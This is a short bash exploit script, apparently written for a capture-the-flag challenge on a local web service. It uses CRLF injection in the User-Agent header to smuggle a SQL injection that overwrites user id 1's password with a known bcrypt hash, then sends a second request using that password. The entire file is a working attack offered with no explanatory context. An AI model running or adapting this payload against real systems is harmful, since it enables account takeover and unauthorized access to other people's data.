#!/bin/bash

url="${1-localhost:1337}"
pass='yeet' 
pass_hash='$2a$12$2FDo2xJTrlj9sg2ZKFf4XOmet14ywY6DK..AYZAUkOFy8Fdd/QJEm'

sqli_post(){
  curl -X POST "${url}/user" \
    -H "User-Agent: Mozilla/7.0%0d%0a%0d%0a{\"username\":\"';\\n${1} WHERE id='1\",\"password\":\"${2-pass}\"}" \
    -d 'username=user&password=passaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
}

sqli_post "UPDATE users SET password='${pass_hash}'"
sqli_post "SELECT * FROM users" ${pass}
